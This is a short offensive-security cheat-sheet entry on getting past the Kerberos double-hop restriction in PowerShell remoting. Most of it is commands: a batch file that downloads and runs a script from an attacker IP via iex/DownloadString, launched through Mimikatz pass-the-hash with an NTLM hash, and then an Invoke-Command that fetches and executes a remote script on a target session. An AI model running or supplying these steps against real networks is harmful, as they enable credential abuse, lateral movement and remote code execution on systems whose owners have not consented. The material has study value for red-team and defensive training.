# Kerberos Double Hop Bypass

By default, Kerberos doesn't permise to run a PSSession into a PSSession (or Invoke-Command into a PSSession, or whatever)

This can be bypassed with Mimikatz, by running a reverse shell in a Over-Pass-the-Hash from a PSSession

    $Contents = "powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://<attacker_IP>/Invoke-HelloWorld.ps1'))"
    Out-File -Encoding Ascii -InputObject $Contents -FilePath ./reverse.bat
    Invoke-Mimikatz -Command '"sekurlsa::pth /user:user1 /domain:domain.local /ntlm:<nthash> /run:.\reverse.bat"'

In the new shell it is not possible to run an Enter-PSSession, but it is possible to create a New-PSSession and run Invoke-Command into this new session

    $sess = New-PSSession <target>
    Invoke-Command -ScriptBlock{whoami;hostname} -Session $sess

    Invoke-Command -ScriptBlock{mkdir /tmp; iwr http://<attacker_IP>/Invoke-HelloWorld.ps1 -o /tmp/Invoke-HelloWorld.ps1; . \tmp\Invoke-HelloWorld.ps1} -Session $sess
